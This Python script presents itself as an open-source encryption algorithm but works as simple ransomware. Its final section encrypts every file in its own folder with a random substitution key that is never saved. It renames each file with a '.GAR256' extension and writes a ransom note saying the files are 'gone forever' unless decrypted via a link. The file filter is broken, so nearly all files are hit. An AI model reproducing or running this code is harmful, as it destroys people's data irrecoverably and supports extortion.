from concurrent.futures import thread
import math
import string
import random
from pathlib import Path
import os
import threading

#Data

keyLength = 256  

#Code

StoredKey = "" #Encrpyt Key
char = [] #All Characters
storedkeylist = []

print("Using GAR-EncryptionAlgorithem --V1.2 --By:2Depth --OpenSource-Version")

for dob in range(len(string.printable)):
    char.append(string.printable[dob])

for kurrent in range(len(string.printable)):
    cd = ""
    for zurrent in range(keyLength):
        cd = cd + char[random.randint(0,len(string.printable)-1)]
    storedkeylist.append(cd)

for keyNum in range(len(string.printable)):
    StoredKey = StoredKey + str(storedkeylist[keyNum])

#Encrypt

def encrypt(txt):
    started = txt
    returnData = ""
    for kurrentKey in range(len(txt)):
        kurrentChar = txt[kurrentKey]
        if kurrentChar in char:
            
            returnData = returnData + storedkeylist[char.index(kurrentChar)]
        else:
            print("Error Ascii : " + kurrentChar + " Not Found!")
    return  returnData

#Decryptor

def decrypt(keyInput,keyStrength,txt):
    char = []
    for dob in range(len(string.printable)):
        char.append(string.printable[dob])
    
    keyUnpacked = []
    endReturn = ""
    for bob in range(math.floor((len(keyInput)/keyStrength))):
        rb = 1
        if bob == 0:
            rb = 0
        keyUnpacked.append(keyInput[keyStrength*bob:(keyStrength*bob)+keyStrength])
    

    if keyInput != StoredKey:
        print("Incorrect Key!")
        return 0

    for bob in range(math.floor(len(txt)/keyStrength)):
        rb = 1
        if bob == 0:
            rb = 0
        endReturn = endReturn + char[keyUnpacked.index(txt[keyStrength*bob:(keyStrength*bob)+keyStrength])]
    return endReturn






key = StoredKey #Gets Stored Key And Renames To 'Key'
length = keyLength #Renames KeyLength into 'length'

#Your Code:
fils = os.listdir(Path(__file__).parent)
print(fils)

def dr_def(fils,fl,file):
    toEncFlW = Path(str(Path(file).parent) + "\\" + fils[fl])
    daya = toEncFlW.read_text()
    cd = encrypt(daya)
    toEncFlW.write_text(cd)
    os.rename(str(Path(str(Path(file).parent) + "\\" + fils[fl])),str(Path(str(Path(file).parent) + "\\" + fils[fl])) + ".GAR" + str(length))

    print("Hashed : " + Path(str(Path(file).parent) + "\\" + fils[fl]).name)
    

for fl in range(len(fils)):
    if fils[fl] != "GAR-EncryptionAlgorithem.py":
        if fils[fl].find("txt") or fils[fl].find("text") or fils[fl].find("lua"):
            x = threading.Thread(target=dr_def,args=(fils,fl,__file__))
            x.start()

open("GAR.txt","a")
open("GAR.txt","w").write("All of your files have been encrypted with GAR-" + str(length) + " , Your files are gone forever. Unless, you Decrypt them here: [Dead link]")
